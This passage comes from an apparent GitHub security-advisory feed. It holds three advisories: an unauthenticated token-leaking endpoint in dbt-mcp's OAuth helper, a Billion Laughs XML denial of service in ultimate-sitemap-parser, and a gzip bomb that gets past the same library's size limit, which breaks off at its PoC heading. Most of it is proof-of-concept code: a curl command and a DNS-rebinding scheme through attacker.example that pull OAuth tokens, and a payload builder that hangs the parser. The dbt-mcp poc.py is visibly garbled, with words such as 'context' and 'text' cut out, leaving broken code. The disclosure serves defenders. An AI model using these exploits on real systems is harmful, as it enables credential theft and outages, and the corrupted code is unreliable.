<p>During the OAuth login flow, <code>dbt-mcp</code> launches an embedded FastAPI server (the "OAuth helper") bound to <code>127.0.0.1</code> starting on port <code>6785</code> (configured at <code>src/dbt_mcp/config/credentials.py:34</code>, <code>OAUTH_REDIRECT_STARTING_PORT = 6785</code>). After the OAuth callback is handled, the helper persists the full token context to disk and continues serving requests.</p>
<p><strong>Data flow from source to sink:</strong></p>
<ol>
<li><strong>Source</strong> — <code>src/dbt_mcp/oauth/fastapi_app.py:106</code>: The OAuth callback receives <code>token_response</code> from the dbt Platform authorization server.</li>
<li><code>src/dbt_mcp/oauth/dbt_platform.py:60</code>: <code>AccessTokenResponse(**token_response)</code> stores <code>access_token</code> and <code>refresh_token</code> as plaintext fields.</li>
<li><code>src/dbt_mcp/oauth/dbt_platform.py:64–69</code>: The <code>AccessTokenResponse</code> is embedded inside <code>DecodedAccessToken</code>, which is in turn embedded inside <code>DbtPlatformContext</code>.</li>
<li><code>src/dbt_mcp/oauth/fastapi_app.py:114</code>: The fully token-bearing <code>DbtPlatformContext</code> object is passed to <code>context_manager</code> for persistence.</li>
<li><strong>Persistence sink</strong> — <code>src/dbt_mcp/oauth/context_manager.py:63–64</code>: <code>yaml.dump(context.model_dump())</code> serializes the entire model — including tokens — to a YAML file on disk.</li>
<li><strong>HTTP sink</strong> — <code>src/dbt_mcp/oauth/fastapi_app.py:162–165</code>: The <code>GET /dbt_platform_context</code> route reads the YAML file back and returns the raw <code>DbtPlatformContext</code> object with no redaction.</li>
</ol>
<pre><code class="language-python"># src/dbt_mcp/oauth/fastapi_app.py:162-165
@app.get("/dbt_platform_context")
def get_dbt_platform_context() -&gt; DbtPlatformContext:
    logger.info("Selected project received")
    return dbt_platform_context_manager.read_context() or DbtPlatformContext()
</code></pre>
<pre><code class="language-python"># src/dbt_mcp/oauth/dbt_platform.py:8-14
class AccessTokenResponse(BaseModel):
    access_token: str
    refresh_token: str
    ...

class DbtPlatformContext(BaseModel):
    decoded_access_token: DecodedAccessToken | None = None
    ...
</code></pre>
<p><strong>Missing protections (confirmed by grep):</strong></p>
<ul>
<li>No <code>TrustedHostMiddleware</code> — the server accepts requests with arbitrary <code>Host</code> headers, enabling DNS rebinding.</li>
<li>No <code>CORSMiddleware</code> — no cross-origin restrictions on which sites can read the response.</li>
<li>No CSRF protection, no session nonce, no <code>Origin</code> header validation.</li>
<li>The route has no FastAPI <code>Depends()</code> security dependency.</li>
</ul>
<p>A <code>grep -Rni "TrustedHostMiddleware\|CORSMiddleware\|csrf\|origin"</code> across the OAuth FastAPI application returns no results.</p>
<p><strong>Recommended remediation:</strong></p>
<pre><code class="language-diff">--- a/src/dbt_mcp/oauth/fastapi_app.py
+++ b/src/dbt_mcp/oauth/fastapi_app.py
+from starlette.middleware.trustedhost import TrustedHostMiddleware
+
+def _redact_context(context: DbtPlatformContext | None) -&gt; DbtPlatformContext:
+    if context is None:
+        return DbtPlatformContext()
+    return context.model_copy(update={"decoded_access_token": None})

     app = FastAPI()
+    app.add_middleware(
+        TrustedHostMiddleware,
+        allowed_hosts=["localhost", "127.0.0.1"],
+    )

     @app.get("/dbt_platform_context")
     def get_dbt_platform_context() -&gt; DbtPlatformContext:
         logger.info("Selected project received")
-        return dbt_platform_context_manager.read_context() or DbtPlatformContext()
+        return _redact_context(dbt_platform_context_manager.read_context())
</code></pre>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong></p>
<ul>
<li><code>dbt-mcp</code> v1.19.1 installed in a Python 3.12 environment.</li>
<li>The following runtime dependencies available: <code>authlib~=1.6.7</code>, <code>fastapi~=0.128.0</code>, <code>uvicorn~=0.38.0</code>, <code>pyyaml~=6.0.2</code>, <code>httpx~=0.28.1</code>, <code>starlette~=0.50.0</code>, <code>pydantic~=2.0</code>, <code>pydantic-settings~=2.10.1</code>.</li>
<li>No <code>DBT_TOKEN</code> set (OAuth flow mode active).</li>
</ul>
<p><strong>Step 1 — Build the Docker test environment:</strong></p>
<pre><code class="language-bash">docker build -t vuln001-dbt-mcp -f vuln-001/Dockerfile .
</code></pre>
<p>The <code>Dockerfile</code> installs only the OAuth helper's runtime dependencies and copies <code>src/</code> and <code>poc.py</code>:</p>
<pre><code class="language-dockerfile">FROM python:3.12-slim
WORKDIR /app
RUN pip install --no-cache-dir \
    "authlib~=1.6.7" "fastapi~=0.128.0" "uvicorn~=0.38.0" \
    "pyjwt~=2.12.0" "pyyaml~=6.0.2" "httpx~=0.28.1" \
    "filelock~=3.20.3" "starlette~=0.50.0" "requests&gt;=2.28" \
    "pydantic~=2.0" "pydantic-settings~=2.10.1"
COPY repo/src /app/src
ENV PYTHONPATH=/app/src
COPY vuln-001/poc.py /app/poc.py
CMD ["python3", "/app/poc.py"]
</code></pre>
<p><strong>Step 2 — Run the PoC:</strong></p>
<pre><code class="language-bash">docker run --rm --network=host vuln001-dbt-mcp
</code></pre>
<p>The PoC script (<code>poc.py</code>) performs the following automatically:</p>
<ol>
<li>Writes a realistic fake OAuth context YAML to <code>/tmp/dbt_poc_mcp.yml</code>, simulating a victim who has already completed the OAuth login flow.</li>
<li>Instantiates the <strong>real</strong> <code>create_app()</code> from <code>src/dbt_mcp/oauth/fastapi_app.py</code> using <code>DbtPlatformContextManager</code> backed by the pre-seeded file.</li>
<li>Starts the server on <code>127.0.0.1:16785</code> in a background thread.</li>
<li>Issues an unauthenticated <code>GET /dbt_platform_context</code> with no <code>Authorization</code> header.</li>
<li>Asserts that <code>access_token</code> and <code>refresh_token</code> are returned verbatim.</li>
</ol>
<p><strong>Equivalent manual curl (against the live OAuth helper during actual OAuth flow):</strong></p>
<pre><code class="language-bash"># While the victim is running the OAuth login flow:
export DBT_HOST='cloud.getdbt.com'
unset DBT_TOKEN
dbt-mcp   # OAuth helper starts on 127.0.0.1:6785

# From any co-located process (or a DNS-rebinding browser page):
curl -s 'http://127.0.0.1:6785/dbt_platform_context' \
  | jq '.decoded_access_token.access_token_response'
</code></pre>
<p><strong>Expected output (Phase 2 observed):</strong></p>
<pre><code>[*] HTTP Status: 200
[*] Full response JSON:
{
  "decoded_access_token": {
    "access_token_response": {
      "access_token": "eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER",
      "refresh_token": "dbt-platform-offline-refresh-SUPERSECRET-abc123",
      "expires_in": 3600,
      "scope": "user_access offline_access",
      "token_type": "Bearer",
      "expires_at": 9999999999
    },
    ...
  },
  ...
}
[!] LEAKED access_token  : eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER
[!] LEAKED refresh_token : dbt-platform-offline-refresh-SUPERSECRET-abc123
[+] VULNERABILITY CONFIRMED: Tokens returned from /dbt_platform_context WITHOUT authentication!
</code></pre>
<p><strong>DNS rebinding variant:</strong></p>
<p>A malicious website can resolve <code>attacker.example</code> to <code>127.0.0.1</code> after the browser's DNS TTL expires ("DNS rebinding"). Because the helper accepts any <code>Host</code> header, the browser treats <code>http://attacker.example:6785</code> as same-origin and fetches <code>/dbt_platform_context</code> via JavaScript <code>fetch()</code>, obtaining the full token JSON across the network without any local access.</p>
<h3 id="impact">Impact</h3>
<p>Any local process running as any user on the same host, or a remote attacker who exploits DNS rebinding against a victim's browser during or after the OAuth login session, can retrieve the victim's full dbt Cloud OAuth tokens with a single unauthenticated HTTP GET request. The <code>access_token</code> grants immediate bearer-token access to the dbt Cloud REST and GraphQL APIs on behalf of the victim. The <code>refresh_token</code> (with <code>offline_access</code> scope) allows the attacker to obtain new access tokens after the original expires, providing persistent unauthorized access until the victim manually revokes the OAuth grant. An attacker with these tokens can read or modify dbt projects, run jobs, access environment secrets, and exfiltrate data lineage and warehouse credentials stored in dbt Cloud.</p>
<p>This vulnerability is a <strong>Missing Authentication for Critical Function</strong> (CWE-306). Any developer machine running <code>dbt-mcp</code> with OAuth-mode authentication is affected for the duration of the OAuth helper process lifetime. Because <code>dbt-mcp</code> is a developer tool, the primary victims are individual developers and their associated dbt Cloud organization accounts.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.12-slim

WORKDIR /app

# Install minimal runtime dependencies (no heavy dbt-protos/dbt-sl-sdk needed
# because fastapi_app.py's import chain doesn't touch them)
RUN pip install --no-cache-dir \
 "authlib~=1.6.7" \
 "fastapi~=0.128.0" \
 "uvicorn~=0.38.0" \
 "pyjwt~=2.12.0" \
 "pyyaml~=6.0.2" \
 "httpx~=0.28.1" \
 "filelock~=3.20.3" \
 "starlette~=0.50.0" \
 "requests&gt;=2.28" \
 "pydantic~=2.0" \
 "pydantic-settings~=2.10.1"

# Copy only the source tree needed for the OAuth server
COPY repo/src /app/src

ENV PYTHONPATH=/app/src

COPY vuln-001/poc.py /app/poc.py

CMD ["python3", "/app/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-001: Unauthenticated OAuth Con Endpoint Leaks dbt Platform Tokens

Attack scenario:
 - dbt-mcp runs a local FastAPI OAuth helper on 127.0.0.1:6785 during login.
 - After the OAuth flow completes, tokens are persisted to ~/.dbt/mcp.yml.
 - GET /dbt_platform_con is accessible with NO authentication at all.
 - Any process on the same host (or a DNS-rebinding browser page) can call it
 and receive the full access_token + refresh_token.

This PoC:
 1. Pre-seeds a con file with fake-but-realistic OAuth tokens
 (simulating a victim who has already completed the OAuth flow).
 2. Starts the real vulnerable FastAPI app from src/dbt_mcp/oauth/fastapi_app.py.
 3. Issues an unauthenticated HTTP GET /dbt_platform_con (no auth header).
 4. Confirms the tokens are returned verbatim.
"""

import asyncio
import json
import os
import sys
import tempfile
import threading
import time
from pathlib import Path

import httpx
import uvicorn
import yaml

# Fake tokens that simulate a victim's completed OAuth session.
FAKE_ACCESS_TOKEN = "eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER"
FAKE_REFRESH_TOKEN = "dbt-platform-offline-refresh-SUPERSECRET-abc123"

FAKE_CONTEXT = {
 "decoded_access_token": {
 "access_token_response": {
 "access_token": FAKE_ACCESS_TOKEN,
 "refresh_token": FAKE_REFRESH_TOKEN,
 "expires_in": 3600,
 "scope": "user_access offline_access",
 "token_type": "Bearer",
 "expires_at": 9999999999,
 },
 "decoded_claims": {
 "sub": "99999",
 "iat": 1700000000,
 "exp": 9999999999,
 },
 },
 "host_prefix": "victimco",
 "dbt_host": "cloud.getdbt.com",
 "account_id": 42,
 "selected_project_ids": None,
 "dev_environment": None,
 "prod_environment": None,
}

PORT = 16785


def start_server(context_file: Path, static_dir: str) -&gt; None:
 """Run the actual vulnerable FastAPI app in a background thread."""
 from authlib.integrations.requests_client import OAuth2Session
 from dbt_mcp.oauth.context_manager import DbtPlatformContextManager
 from dbt_mcp.oauth.fastapi_app import create_app

 context_manager = DbtPlatformContextManager(context_file)

 # A dummy OAuth client — only used by the /oauth-callback route,
 # which this PoC never triggers.
 fake_oauth_client = OAuth2Session(client_id="poc-dummy-client")

 app = create_app(
 oauth_client=fake_oauth_client,
 state_to_verifier={},
 dbt_platform_url="https://cloud.getdbt.com",
 static_dir=static_dir,
 dbt_platform_context_manager=context_manager,
 )

 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 config = uvicorn.Config(
 app=app, host="127.0.0.1", port=PORT, log_level="error", loop="asyncio"
 )
 server = uvicorn.Server(config)
 loop.run_until_complete(server.serve())


def wait_for_server(port: int, timeout: float = 15.0) -&gt; bool:
 import socket

 deadline = time.time() + timeout
 while time.time() &lt; deadline:
 try:
 with socket.create_connection(("127.0.0.1", port), timeout=1):
 return True
 except OSError:
 time.sleep(0.2)
 return False


def main() -&gt; int:
 print("[*] VULN-001 PoC — Unauthenticated /dbt_platform_con token leak")
 print("=" * 70)

 # 1. Pre-seed con file (victim has completed OAuth; tokens are on disk)
 context_file = Path("/tmp/dbt_poc_mcp.yml")
 context_file.write_(
 yaml.dump(FAKE_CONTEXT, default_flow_style=False), encoding="utf-8"
 )
 print(f"[*] Con file written: {context_file}")
 print(f" access_token : {FAKE_ACCESS_TOKEN}")
 print(f" refresh_token : {FAKE_REFRESH_TOKEN}")

 # 2. Minimal static dir so NoCacheStaticFiles mount doesn't error on startup
 static_dir = tempfile.mkdtemp(prefix="dbt_poc_static_")
 (Path(static_dir) / "index.html").write_("&lt;html&gt;dbt OAuth&lt;/html&gt;")

 # 3. Start the real vulnerable FastAPI server in a background thread
 t = threading.Thread(
 target=start_server, args=(context_file, static_dir), daemon=True
 )
 t.start()

 print(f"\n[*] Waiting for FastAPI server to start on 127.0.0.1:{PORT} ...")
 if not wait_for_server(PORT):
 print("[-] FAIL: Server did not start within timeout.")
 return 2

 print("[*] Server is up.")

 # 4. Send unauthenticated GET /dbt_platform_con (no Authorization header)
 url = f"http://127.0.0.1:{PORT}/dbt_platform_con"
 print(f"\n[*] Sending unauthenticated GET {url}")
 try:
 resp = httpx.get(url, timeout=10)
 except Exception as exc:
 print(f"[-] HTTP request failed: {exc}")
 return 2

 print(f"[*] HTTP Status: {resp.status_code}")

 if resp.status_code != 200:
 print(f"[-] FAIL: Expected 200, got {resp.status_code}")
 print(f" Body: {resp.[:500]}")
 return 1

 try:
 data = resp.json()
 except Exception as exc:
 print(f"[-] FAIL: Response is not JSON: {exc}\n Body: {resp.[:500]}")
 return 1

 print(f"\n[*] Full response JSON:\n{json.dumps(data, indent=2)}")

 # 5. Verify that the tokens are in the response (no redaction, no auth required)
 try:
 leaked_access = (
 data["decoded_access_token"]["access_token_response"]["access_token"]
 )
 leaked_refresh = (
 data["decoded_access_token"]["access_token_response"]["refresh_token"]
 )
 except (KeyError, TypeError) as exc:
 print(f"\n[-] FAIL: Token fields missing from response: {exc}")
 return 1

 print(f"\n[!] LEAKED access_token : {leaked_access}")
 print(f"[!] LEAKED refresh_token : {leaked_refresh}")

 if leaked_access == FAKE_ACCESS_TOKEN and leaked_refresh == FAKE_REFRESH_TOKEN:
 print(
 "\n[+] VULNERABILITY CONFIRMED:"
 " Tokens returned from /dbt_platform_con WITHOUT authentication!"
 )
 return 0
 else:
 print("\n[-] FAIL: Returned tokens do not match expected values.")
 print(f" Expected access_token : {FAKE_ACCESS_TOKEN}")
 print(f" Got access_token : {leaked_access}")
 return 1


if __name__ == "__main__":
 sys.exit(main())
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dbt-labs/dbt-mcp/security/advisories/GHSA-jr33-mw75-7j8f">https://github.com/dbt-labs/dbt-mcp/security/advisories/GHSA-jr33-mw75-7j8f</a></li>
<li><a href="https://github.com/advisories/GHSA-jr33-mw75-7j8f">https://github.com/advisories/GHSA-jr33-mw75-7j8f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr33-mw75-7j8f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T21:15:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ultimate-sitemap-parser] Ultimate Sitemap Parser (USP): XML Entity Expansion (Billion Laughs) DoS in XMLSitemapParser]]></title>
        <id>https://github.com/advisories/GHSA-p5wc-9w9r-m232</id>
        <link href="https://github.com/advisories/GHSA-p5wc-9w9r-m232"/>
        <updated>2026-06-19T21:15:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="xml-entity-expansion-billion-laughs-dos-in-xmlsitemapparser">XML Entity Expansion (Billion Laughs) DoS in XMLSitemapParser</h2>
<h3 id="summary">Summary</h3>
<p><code>ultimate-sitemap-parser</code> version 1.8.0 and earlier parse attacker-controlled XML content using Python's <code>xml.parsers.expat</code> without any restriction on DTD declarations or recursive entity references. An attacker who can serve a malicious sitemap can trigger exponential XML entity expansion (the "Billion Laughs" attack), causing unbounded CPU and memory consumption in the victim process. No authentication, user interaction, or special configuration is required — the vulnerability is exploitable by default through any public-facing use of <code>sitemap_tree_for_homepage()</code> or <code>sitemap_from_str()</code>.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code path begins at the public API entry points and flows to the Expat XML parser without any sanitization:</p>
<ol>
<li><strong><code>usp/tree.py:42</code></strong> — <code>sitemap_tree_for_homepage(homepage_url)</code> is the primary public entry point.</li>
<li><strong><code>usp/tree.py:133</code></strong> — <code>sitemap_from_str(content)</code> is the secondary public entry point (also directly reachable from user code).</li>
<li><strong><code>usp/fetch_parse.py:141-145</code></strong> — <code>SitemapFetcher._fetch()</code> retrieves the remote URL content.</li>
<li><strong><code>usp/fetch_parse.py:175</code></strong> — The raw response becomes <code>response_content</code> (taint propagation point).</li>
<li><strong><code>usp/fetch_parse.py:441-450</code></strong> — <code>XMLSitemapParser.sitemap()</code> creates an Expat parser and feeds the attacker-controlled content directly to it:</li>
</ol>
<pre><code class="language-python"># usp/fetch_parse.py:441-450  — VULNERABLE SINK
parser = xml.parsers.expat.ParserCreate(
    namespace_separator=self.__XML_NAMESPACE_SEPARATOR
)
# ... handler assignments ...
parser.Parse(self._content, is_final)   # &lt;-- no DTD/entity restriction
</code></pre>
<p>A full audit of the <code>usp/</code> directory confirms that none of the following hardening measures are present:</p>
<ul>
<li><code>defusedxml</code> usage</li>
<li>DOCTYPE rejection</li>
<li><code>SetParamEntityParsing</code></li>
<li><code>UseForeignDTD</code></li>
<li><code>ExternalEntityRefHandler</code></li>
</ul>
<p>When a Billion Laughs payload is parsed, each nested entity reference is expanded recursively, multiplying the in-memory string by a factor of 10 per nesting level. At level 6 (10⁶ expansions), processing time exceeds 20 seconds, effectively hanging the calling process.</p>
<h3 id="poc">PoC</h3>
<p><strong>Environment setup:</strong></p>
<pre><code class="language-bash"># Option A: install from PyPI
python -m venv /tmp/usp-poc
. /tmp/usp-poc/bin/activate
pip install ultimate-sitemap-parser==1.8.0
</code></pre>
<pre><code class="language-bash"># Option B: Docker (using the provided Dockerfile)
docker build -t vuln-001-usp -f vuln-001/Dockerfile .
docker run --rm vuln-001-usp
</code></pre>
<p><strong>Attack payload and execution:</strong></p>
<pre><code class="language-python">from usp.tree import sitemap_from_str
import time, signal

TIMEOUT = 20

class TimedOut(Exception): pass
def handler(s, f): raise TimedOut()

def build_payload(level):
    lines = ['&lt;?xml version="1.0"?&gt;', '&lt;!DOCTYPE x [']
    lines.append(' &lt;!ENTITY lol "lol"&gt;')
    for i in range(1, level + 1):
        prev = "lol" if i == 1 else f"lol{i-1}"
        expansion = "".join(f"&amp;{prev};" for _ in range(10))
        lines.append(f' &lt;!ENTITY lol{i} "{expansion}"&gt;')
    lines.append(']&gt;')
    lines.append('&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;')
    lines.append(f'  &lt;url&gt;&lt;loc&gt;http://example.com/&amp;lol{level};&lt;/loc&gt;&lt;/url&gt;')
    lines.append('&lt;/urlset&gt;')
    return "\n".join(lines)

for level in [3, 4, 5, 6]:
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(TIMEOUT)
    t = time.perf_counter()
    try:
        result = sitemap_from_str(build_payload(level))
        elapsed = time.perf_counter() - t
        signal.alarm(0)
        pages = list(result.all_pages())
        url_len = len(pages[0].url) if pages else 0
        print(f"Level {level}: {elapsed:.4f}s  url_len={url_len:,}")
    except TimedOut:
        elapsed = time.perf_counter() - t
        signal.alarm(0)
        print(f"Level {level}: TIMEOUT after {elapsed:.1f}s -- DoS confirmed")
</code></pre>
<p><strong>Expected output (observed during dynamic reproduction):</strong></p>
<pre><code>Level 3 (10^3):   0.0054s   url_len=3,019
Level 4 (10^4):   0.0321s   url_len=30,019
Level 5 (10^5):   5.2845s   url_len=300,019
Level 6 (10^6):  TIMEOUT after 20.0011s  -- DoS confirmed
</code></pre>
<p>Processing time grows exponentially: level 5 is ~165× slower than level 4, and level 6 exceeds the 20-second watchdog. This conclusively demonstrates unbounded resource consumption.</p>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Denial-of-Service (DoS)</strong> vulnerability via XML Entity Expansion (the "Billion Laughs" / CWE-776 pattern). Any application or service that uses <code>ultimate-sitemap-parser</code> to crawl external or user-supplied URLs is impacted.</p>
<p><strong>Who is affected:</strong></p>
<ul>
<li><strong>Web crawlers and indexers</strong> that call <code>sitemap_tree_for_homepage()</code> against arbitrary URLs — a single malicious sitemap server can lock up the crawler process.</li>
<li><strong>CI/CD pipelines and monitoring tools</strong> that periodically parse sitemaps as part of automated workflows.</li>
<li><strong>Any application</strong> that passes unvalidated user input to <code>sitemap_from_str()</code>.</li>
</ul>
<p>Because no authentication, elevated privilege, or prior relationship is required (CVSS PR:N, UI:N), the attack surface is broad. An attacker only needs to operate a web server that returns a malicious sitemap when visited.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.11-slim

LABEL description="VULN-001: XML Entity Expansion (Billion Laughs) DoS PoC" \
      target="GateNLP/ultimate-sitemap-parser &lt;= 1.8.0" \
      cwe="CWE-776"

WORKDIR /app

# Copy the cloned repository first
COPY repo/ /app/repo/

# Install uv_build (required build backend) then install the vulnerable package from the local clone
RUN pip install --no-cache-dir "uv_build&gt;=0.9.6,&lt;0.10.0" &amp;&amp; \
    pip install --no-cache-dir /app/repo/

# Copy the PoC script
COPY vuln-001/poc.py /app/poc.py

CMD ["python3", "-u", "/app/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-001: XML Entity Expansion (Billion Laughs) DoS
Affected: GateNLP/ultimate-sitemap-parser &lt;= 1.8.0
CWE-776: Improper Restriction of Recursive Entity References in DTDs
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5 High)

Sink: usp/fetch_parse.py:450
  parser = xml.parsers.expat.ParserCreate(namespace_separator=...)
  parser.Parse(self._content, is_final)   &lt;- no DTD/entity restriction

Entry: usp.tree.sitemap_from_str(content: str) -&gt; AbstractSitemap
"""

import signal
import sys
import time

from usp.tree import sitemap_from_str

TIMEOUT_SECONDS = 20
DOS_THRESHOLD_SECONDS = 2.0  # level 5 must exceed this to PASS


class TimedOut(Exception):
    pass


def _alarm_handler(signum, frame):
    raise TimedOut("SIGALRM fired")


def build_billion_laughs_payload(level: int) -&gt; str:
    """Build a Billion Laughs XML payload nested to `level` depth.

    Each level multiplies expansion by 10:
      level 3 -&gt; 10^3   = 1,000 chars
      level 4 -&gt; 10^4   = 10,000 chars
      level 5 -&gt; 10^5   = 100,000 chars
      level 6 -&gt; 10^6   = 1,000,000 chars
    """
    lines = ['&lt;?xml version="1.0"?&gt;', "&lt;!DOCTYPE x ["]
    lines.append(' &lt;!ENTITY lol "lol"&gt;')
    for i in range(1, level + 1):
        prev = "lol" if i == 1 else f"lol{i - 1}"
        expansion = "".join(f"&amp;{prev};" for _ in range(10))
        lines.append(f' &lt;!ENTITY lol{i} "{expansion}"&gt;')
    lines.append("]&gt;")
    lines.append('&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;')
    lines.append(f"  &lt;url&gt;&lt;loc&gt;http://example.com/&amp;lol{level};&lt;/loc&gt;&lt;/url&gt;")
    lines.append("&lt;/urlset&gt;")
    return "\n".join(lines)


def parse_with_timeout(payload: str):
    """Parse payload under SIGALRM watchdog; return (elapsed, url_len, timed_out)."""
    signal.signal(signal.SIGALRM, _alarm_handler)
    signal.alarm(TIMEOUT_SECONDS)
    start = time.perf_counter()
    timed_out = False
    url_len = 0
    try:
        result = sitemap_from_str(payload)
        elapsed = time.perf_counter() - start
        signal.alarm(0)
        pages = list(result.all_pages())
        if pages:
            url_len = len(pages[0].url)
    except TimedOut:
        elapsed = time.perf_counter() - start
        timed_out = True
        signal.alarm(0)
    except Exception as exc:
        elapsed = time.perf_counter() - start
        signal.alarm(0)
        print(f"    [EXCEPTION] {type(exc).__name__}: {exc}", flush=True)
    return elapsed, url_len, timed_out


def main() -&gt; int:
    print("=" * 64)
    print("VULN-001  XML Entity Expansion DoS  (Billion Laughs)")
    print("Target : GateNLP/ultimate-sitemap-parser &lt;= 1.8.0")
    print("Sink   : usp/fetch_parse.py:450  parser.Parse(_content)")
    print(f"Timeout: {TIMEOUT_SECONDS}s per level")
    print("=" * 64)

    results = {}
    for level in [3, 4, 5, 6]:
        theoretical = 10**level
        payload = build_billion_laughs_payload(level)
        print(
            f"\n[*] Level {level}: 10^{level} = {theoretical:&gt;10,} chars  "
            f"payload_bytes={len(payload)}",
            flush=True,
        )
        elapsed, url_len, timed_out = parse_with_timeout(payload)
        results[level] = (elapsed, url_len, timed_out)

        if timed_out:
            print(
                f"[!] Level {level}: TIMED OUT after {elapsed:.1f}s  "
                f"(&gt;{TIMEOUT_SECONDS}s)  -- DoS confirmed",
                flush=True,
            )
        else:
            print(
                f"[+] Level {level}: completed in {elapsed:.4f}s  "
                f"url_len={url_len:,}",
                flush=True,
            )

    print("\n" + "=" * 64)
    print("TIMING SUMMARY")
    print("=" * 64)
    for lvl, (elapsed, url_len, timed_out) in results.items():
        status = f"TIMEOUT &gt;{TIMEOUT_SECONDS}s" if timed_out else f"{elapsed:.4f}s"
        print(f"  Level {lvl} (10^{lvl:&gt;1}): {status:&gt;20}   url_len={url_len:,}")

    print()

    # Verdict: level 5 must take &gt;2s or level 6 must time out
    lvl5_elapsed, _, lvl5_timed_out = results.get(5, (0, 0, False))
    lvl6_elapsed, _, lvl6_timed_out = results.get(6, (0, 0, False))

    slow_evidence = lvl5_elapsed &gt; DOS_THRESHOLD_SECONDS or lvl5_timed_out
    timeout_evidence = lvl6_timed_out or lvl6_elapsed &gt; DOS_THRESHOLD_SECONDS

    if slow_evidence or timeout_evidence:
        print("[PASS] DoS CONFIRMED: exponential CPU exhaustion via XML entity expansion")
        print(
            f"       level-5 time={lvl5_elapsed:.4f}s  level-6 "
            + ("TIMEOUT" if lvl6_timed_out else f"time={lvl6_elapsed:.4f}s")
        )
        print("[PASS] CWE-776 Billion Laughs confirmed in ultimate-sitemap-parser &lt;= 1.8.0")
        return 0
    else:
        print("[FAIL] Timing did not show significant slowdown -- DoS not confirmed")
        print(f"       level-5={lvl5_elapsed:.4f}s  level-6={lvl6_elapsed:.4f}s")
        print("       (expected level-5 &gt; 2s or level-6 to time out)")
        return 1


if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GateNLP/ultimate-sitemap-parser/security/advisories/GHSA-p5wc-9w9r-m232">https://github.com/GateNLP/ultimate-sitemap-parser/security/advisories/GHSA-p5wc-9w9r-m232</a></li>
<li><a href="https://github.com/advisories/GHSA-p5wc-9w9r-m232">https://github.com/advisories/GHSA-p5wc-9w9r-m232</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p5wc-9w9r-m232</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:15:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ultimate-sitemap-parser] Ultimate Sitemap Parser (USP): Gzip Decompression Bomb Bypasses Sitemap Size Limit]]></title>
        <id>https://github.com/advisories/GHSA-8823-qg2x-pv9f</id>
        <link href="https://github.com/advisories/GHSA-8823-qg2x-pv9f"/>
        <updated>2026-06-19T21:15:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="gzip-decompression-bomb-bypasses-sitemap-size-limit">Gzip Decompression Bomb Bypasses Sitemap Size Limit</h2>
<h3 id="summary">Summary</h3>
<p><code>ultimate-sitemap-parser</code> enforces a 100 MiB size limit on sitemap responses, but applies it only to the <strong>compressed</strong> bytes received over the network. When a <code>.gz</code> sitemap is fetched, <code>usp/helpers.py:239</code> calls <code>gzip_lib.decompress(data)</code> with no output-size cap, allowing an attacker-controlled server to serve a small gzip-compressed payload (~549 KB) that expands to over 120 MiB in process memory. This completely bypasses the declared limit and can exhaust memory or crash any process that calls <code>sitemap_tree_for_homepage()</code> against an untrusted site.</p>
<h3 id="details">Details</h3>
<p>The library declares a maximum sitemap size constant in <code>usp/fetch_parse.py:64</code>:</p>
<pre><code class="language-python">__MAX_SITEMAP_SIZE = 100 * 1024 * 1024  # Max. uncompressed sitemap size
</code></pre>
<p>Despite the comment saying "uncompressed", this value is passed directly to the HTTP client layer at <code>usp/fetch_parse.py:130</code>:</p>
<pre><code class="language-python">web_client.set_max_response_data_length(self.__MAX_SITEMAP_SIZE)
</code></pre>
<p>The HTTP client (<code>usp/web_client/requests_client.py:57-58</code>) slices only the raw compressed response bytes:</p>
<pre><code class="language-python">data = self.__requests_response.content[: self.__max_response_data_length]
</code></pre>
<p>The truncated (but still compressed) bytes are then passed through the pipeline to <code>usp/fetch_parse.py:175</code>:</p>
<pre><code class="language-python">response_content = ungzipped_response_content(url=self._url, response=response)
</code></pre>
<p>Inside <code>ungzipped_response_content</code> (<code>usp/helpers.py:265-267</code>), when the URL ends in <code>.gz</code> or the response carries a gzip content type, decompression is triggered:</p>
<pre><code class="language-python">if __response_is_gzipped_data(url=url, response=response):
    data = gunzip(data)
</code></pre>
<p>The <code>gunzip</code> function (<code>usp/helpers.py:239</code>) decompresses without any output-size guard:</p>
<pre><code class="language-python">gunzipped_data = gzip_lib.decompress(data)
</code></pre>
<p>No post-decompression size check exists anywhere in the call chain. Dynamic reproduction confirmed that 549,213 bytes of compressed input passed the 100 MiB gate check (<code>compressed &lt; limit → True</code>) and then expanded to 125,829,234 bytes (120.0 MiB) in memory with no exception raised.</p>
<h3 id="poc">PoC</h3>
